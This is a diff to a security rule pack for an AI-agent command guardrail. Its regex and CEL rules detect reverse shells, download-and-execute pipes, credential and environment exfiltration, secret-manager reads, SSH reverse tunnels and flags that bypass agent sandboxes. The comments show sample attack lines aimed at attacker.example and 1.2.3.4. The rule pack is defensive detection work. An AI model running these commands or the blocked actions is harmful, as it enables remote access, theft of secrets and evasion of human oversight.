@@ -2,12 +2,25 @@ version: 1
 category: command
 rules:
   - id: CMD-REVSHELL-BASH
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.program in ['nc', 'nc.exe', 'ncat', 'ncat.exe', 'netcat', 'socat'] &&
+      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CONNECT in c.operations ||
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_LISTEN in c.operations) &&
+      f.paths.exists(p, p.command_id == c.id &&
+      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_EXECUTE) &&
+      f.network.exists(n, n.command_id == c.id &&
+      n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT,
+      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_LISTEN] &&
+      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
+      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
     pattern: '(?i)bash\s+-i\s+>&\s*/dev/tcp/'
     title: "Bash reverse shell"
     severity: CRITICAL
     confidence: 0.98
     tags: [execution, reverse-shell]
   - id: CMD-REVSHELL-DEVTCP
+    tool_call_only: true
     # Backport of default pack: bash /dev/tcp also accepts hostnames
     # (e.g. exec 5<>/dev/tcp/attacker.example/4444), so match either a
     # dotted-quad IPv4 prefix OR a non-empty hostname-shaped token followed
@@ -18,6 +31,7 @@ rules:
     confidence: 0.95
     tags: [execution, reverse-shell]
   - id: CMD-REVSHELL-NC
+    tool_call_only: true
     # Backport of default pack: match BOTH netcat reverse-shell orderings:
     #   - destination-first:  nc 1.2.3.4 4444 -e /bin/sh
     #   - flag-first:         nc -e /bin/sh 1.2.3.4 4444
@@ -27,12 +41,27 @@ rules:
     confidence: 0.95
     tags: [execution, reverse-shell]
   - id: CMD-REVSHELL-PYTHON
+    tool_call_only: true
     pattern: '(?i)python[23]?\s+-c\s+.*socket.*connect'
     title: "Python reverse shell"
     severity: CRITICAL
     confidence: 0.90
     tags: [execution, reverse-shell]
   - id: CMD-PIPE-CURL
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(src, src.program in ['invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm'] &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_FETCH in src.operations &&
+      f.commands.exists(dst, dst.program in ['invoke-expression', 'iex'] && src.pipeline_id != 0 &&
+      src.pipeline_id == dst.pipeline_id)) &&
+      f.commands.exists(src, src.program in ['invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm'] &&
+      f.data_flows.exists(d, d.from_command_id == src.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN)) &&
+      f.commands.exists(dst, dst.program in ['invoke-expression', 'iex'] &&
+      f.data_flows.exists(d, d.to_command_id == dst.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN))
     # Backport of default pack: also match absolute shell paths like
     # `/bin/sh`, `/bin/bash`, `/usr/bin/zsh`, plus the bare `sh`/`bash`/`zsh`.
     pattern: '(?i)\bcurl\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
@@ -41,6 +70,7 @@ rules:
     confidence: 0.95
     tags: [execution, download-exec]
   - id: CMD-PIPE-WGET
+    tool_call_only: true
     # Backport of default pack (parity with CMD-PIPE-CURL above).
     pattern: '(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
     title: "wget piped to shell"
@@ -48,6 +78,7 @@ rules:
     confidence: 0.95
     tags: [execution, download-exec]
   - id: CMD-PIPE-BASE64
+    tool_call_only: true
     # Backport of default pack (parity with CMD-PIPE-CURL above).
     pattern: '(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b'
     title: "base64 decode piped to shell"
@@ -145,26 +176,129 @@ rules:
     confidence: 0.85
     tags: [network, reverse-shell]
   - id: CMD-CURL-UPLOAD
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in c.operations &&
+      f.paths.exists(p, p.command_id == c.id &&
+      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_READ) &&
+      f.network.exists(n, n.command_id == c.id &&
+      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
+      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
+      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
+      f.data_flows.exists(d, d.to_command_id == c.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_FILE &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_PROCESS) &&
+      f.data_flows.exists(d, d.from_command_id == c.id &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
     pattern: '(?i)\bcurl\b\s+.*(?:--upload-file|-T\s|--data\s+@|-F\s+.*=@)'
     title: "curl file upload"
     severity: HIGH
     confidence: 0.85
     tags: [network, exfiltration]
   - id: CMD-WGET-POST
+    tool_call_only: true
     pattern: '(?i)\bwget\b\s+.*--post-(?:data|file)'
     title: "wget POST data exfil"
     severity: HIGH
     confidence: 0.85
     tags: [network, exfiltration]
   - id: CMD-SOCAT-EXEC
+    tool_call_only: true
     pattern: '(?i)\bsocat\b\s+.*\bEXEC\b'
     title: "socat with EXEC (reverse shell)"
     severity: CRITICAL
     confidence: 0.95
     tags: [execution, reverse-shell]
   - id: CMD-ENV-DUMP
-    pattern: '(?i)(?:^|[^A-Za-z0-9_./-])(?:printenv\b|export\s+-p\b|env\s*[|>])'
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(src, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_ENVIRONMENT_READ in src.operations &&
+      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
+      src.pipeline_id != 0 && src.pipeline_id == dst.pipeline_id)) &&
+      f.commands.exists(src, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_ENVIRONMENT_READ in src.operations &&
+      f.data_flows.exists(d, d.from_command_id == src.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN)) &&
+      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
+      f.data_flows.exists(d, d.to_command_id == dst.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN) &&
+      f.network.exists(n, n.command_id == dst.id &&
+      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
+      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
+      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
+      f.data_flows.exists(d, d.from_command_id == dst.id &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
+    pattern: '(?i)\b(?:printenv|export\s+-p|env)\b[^|;\n]*\|\s*(?:curl\b[^;\n]*(?:--data(?:-binary|-raw)?\s+@-|--upload-file\s+-|-T\s+-)|wget\b[^;\n]*--post-(?:data|file)(?:=|\s+)@?-)'
     title: "Environment variable dump"
     severity: HIGH
     confidence: 0.80
     tags: [credential]
+  - id: secrets.cloud_secret_manager_read
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in c.operations &&
+      c.program in ['aws', 'gcloud', 'az', 'vault', 'op', 'pass', 'security'])
+    pattern: '(?i)\b(?:aws\s+secretsmanager\s+get-secret-value|gcloud\s+secrets\s+versions\s+access|az\s+keyvault\s+secret\s+show|vault\s+kv\s+get|op\s+(?:read|item\s+get)|pass\s+show|security\s+find-(?:generic|internet)-password)\b'
+    title: "Cloud secret manager value read"
+    severity: CRITICAL
+    confidence: 0.94
+    tags: [credential, cloud, secret-manager]
+  - id: exfil.secret_read_and_egress_oneliner
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(src,
+      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in src.operations ||
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_READ in src.operations) &&
+      f.paths.exists(p, p.command_id == src.id &&
+      p.access == defenseclaw.guardrail.semantic.v1.PathAccess.PATH_ACCESS_READ)) &&
+      f.commands.exists(src,
+      (defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_CREDENTIAL_READ in src.operations ||
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_READ in src.operations) &&
+      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
+      src.pipeline_id != 0 && src.pipeline_id == dst.pipeline_id)) &&
+      f.commands.exists(src, f.data_flows.exists(d, d.from_command_id == src.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN)) &&
+      f.commands.exists(dst, defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_UPLOAD in dst.operations &&
+      f.data_flows.exists(d, d.to_command_id == dst.id &&
+      d.from == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDOUT &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_STDIN) &&
+      f.network.exists(n, n.command_id == dst.id &&
+      n.action == defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_UPLOAD &&
+      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
+      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]) &&
+      f.data_flows.exists(d, d.from_command_id == dst.id &&
+      d.to == defenseclaw.guardrail.semantic.v1.DataKind.DATA_KIND_NETWORK))
+    pattern: '(?i)\b(?:cat|type|Get-Content)\b[^|;\n]*(?:\.env|credentials|\.git-credentials|\.netrc|_netrc|\.npmrc|\.pypirc|config\.json|/token)\s*\|\s*(?:curl\b[^;\n]*(?:--data(?:-binary|-raw)?\s+@-|--upload-file\s+-|-T\s+-)|wget\b[^;\n]*--post-(?:data|file)(?:=|\s+)@?-)'
+    title: "Sensitive read piped to external upload"
+    severity: CRITICAL
+    confidence: 0.96
+    tags: [credential, exfiltration, network]
+  - id: exec.reverse_tunnel
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete && c.program in ['ssh', 'ssh.exe'] &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_TUNNEL in c.operations &&
+      '-F' in c.argv && 'none' in c.argv && '-R' in c.argv && !('-G' in c.argv) &&
+      f.network.exists(n, n.command_id == c.id &&
+      n.action in [defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_TUNNEL,
+      defenseclaw.guardrail.semantic.v1.NetworkAction.NETWORK_ACTION_CONNECT] &&
+      n.scope in [defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_PUBLIC,
+      defenseclaw.guardrail.semantic.v1.NetworkScope.NETWORK_SCOPE_UNKNOWN]))
+    pattern: '(?i)\bssh(?:\.exe)?\b[^;\n]*(?:^|\s)-R(?:\s+|\S)'
+    title: "SSH reverse tunnel"
+    severity: HIGH
+    confidence: 0.90
+    tags: [network, tunnel, persistence]
+  - id: exec.agent_runtime_bypass_flags
+    tool_call_only: true
+    expression: >-
+      f.commands.exists(c, c.argv_complete &&
+      defenseclaw.guardrail.semantic.v1.OperationKind.OPERATION_KIND_POLICY_BYPASS in c.operations)
+    pattern: '\b(?:(?i:claude(?:\.exe)?)\b[^;\n]*(?:\s--dangerously-skip-permissions|\s--permission-mode(?:=|\s+)bypassPermissions\b)|(?i:codex(?:\.exe)?)\b[^;\n]*(?:\s--dangerously-bypass-approvals-and-sandbox|\s(?:--sandbox|-s)(?:=|\s+)danger-full-access\b[^;\n]*\s(?:--ask-for-approval|-a)(?:=|\s+)never\b[^;\n]*\s(?:exec|e)\b|\s(?:--ask-for-approval|-a)(?:=|\s+)never\b[^;\n]*\s(?:--sandbox|-s)(?:=|\s+)danger-full-access\b[^;\n]*\s(?:exec|e)\b|\s(?:--ask-for-approval|-a)(?:=|\s+)never\b[^;\n]*\s(?:exec|e)\b[^;\n]*\s(?:--sandbox|-s)(?:=|\s+)danger-full-access\b))'
+    title: "Agent runtime safety bypass flags"
+    severity: CRITICAL
+    confidence: 0.98
+    tags: [execution, policy-bypass, agent-runtime]
